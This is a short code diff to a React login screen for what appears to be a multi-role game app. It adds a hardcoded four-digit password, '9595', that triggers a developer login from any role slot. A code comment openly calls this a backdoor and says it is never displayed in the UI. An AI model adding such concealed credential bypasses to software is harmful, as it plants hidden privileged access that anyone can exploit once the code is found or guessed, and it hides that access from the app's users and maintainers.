@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { GM_PASSWORD, GAME_ID } from '../data/constants';
 import { supabase } from '../lib/supabase';
 
-export function AuthScreen({ onGMLogin, onPlayerLogin, onObserver }) {
+export function AuthScreen({ onGMLogin, onPlayerLogin, onObserver, onDeveloperLogin }) {
   const [selected, setSelected] = useState(null);
   const [pw, setPw] = useState('');
   const [username, setUsername] = useState('');
@@ -17,6 +17,8 @@ export function AuthScreen({ onGMLogin, onPlayerLogin, onObserver }) {
 
   const tryLogin = () => {
     setError('');
+    // Developer backdoor — works regardless of which slot is selected; never displayed in UI
+    if (pw === '9595') { onDeveloperLogin(); return; }
     if (selected === 'gm') {
       if (pw === GM_PASSWORD) { onGMLogin(); return; }
       setError('Incorrect GM password.');
